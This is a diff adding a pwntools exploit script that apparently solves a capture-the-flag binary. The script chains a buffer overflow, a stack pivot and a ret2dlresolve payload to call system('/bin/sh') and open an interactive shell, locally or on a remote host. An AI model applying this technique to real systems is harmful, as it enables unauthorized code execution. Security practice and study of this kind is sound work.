@@ -1,0 +1,89 @@
+#!/usr/bin/python3
+from pwn import *
+
+
+sla = lambda delim, data: p.sendlineafter(delim, data)
+sa = lambda delim, data: p.sendafter(delim, data)
+s = lambda data: p.send(data)
+sl = lambda data: p.sendline(data)
+r = lambda nbytes: p.recv(nbytes)
+ru = lambda data: p.recvuntil(data)
+rl = lambda : p.recvline()
+
+
+elf = context.binary = ELF('chall', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+base = None
+def int_from_bytes(bytes):
+    return int.from_bytes(bytes, byteorder='little')
+def get_exe_base(pid):
+    maps_file = f"/proc/{pid}/maps"
+    exe_base = None
+
+    with open(maps_file, 'r') as f:
+        exe_base = int(f.readline().split('-')[0], 16)
+
+    if exe_base is None:
+        raise Exception("Executable base address not found.")
+    
+    return exe_base
+
+def GDB(proc):
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript=f'''
+                   b *0x4011B7
+                    c
+                    ''')
+
+if args.REMOTE:
+    p = remote(sys.argv[1], sys.argv[2])
+else:
+    p = process()
+    #base = get_exe_base(p.pid)
+if args.REMOTE:
+    ru(b'proof-of-work: disabled ==')
+context.log_level = 'debug' 
+dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
+print('addr: ', hex(dlresolve.data_addr))
+print(dlresolve.payload)
+print('len: ', hex(len(dlresolve.payload)))
+print(dlresolve.reloc_index)
+
+
+NEW_RBP = 0x404a00
+TARGET = 0x40119A
+POP_RBP = 0x000000000040115e #: nop ; pop rbp ; ret
+
+
+
+payload = b'A'*0x60 + p64(NEW_RBP)
+payload += p64(TARGET)
+#GDB(p)
+sl(payload)
+
+MOV_RDI_RSI = 0x000000000040115a #: mov rdi, rsi ; ret
+POP_RSI = 0x0000000000401165 #: pop rsi ; ret
+LEAVE = 0x4011B6
+binsh = 0x404e50
+JMP_REL = 0x401020
+
+
+payload = flat(POP_RBP, dlresolve.data_addr + 0x60,
+               TARGET, POP_RSI,
+               binsh, MOV_RDI_RSI, LEAVE + 1,
+               JMP_REL, dlresolve.reloc_index)
+payload = payload.ljust(0x60, b'A')
+payload += p64(NEW_RBP - 0x60 - 8) + p64(LEAVE)
+#p.wait(1)
+sl(payload)
+
+
+
+NEW_RBP = 0x404a00 - 0x50
+payload = dlresolve.payload
+payload = payload.ljust(0x60, b'\x00')
+payload += p64(NEW_RBP) + p64(LEAVE)
+#p.wait(1)
+sl(payload)
+#p.wait(1)
+p.interactive()
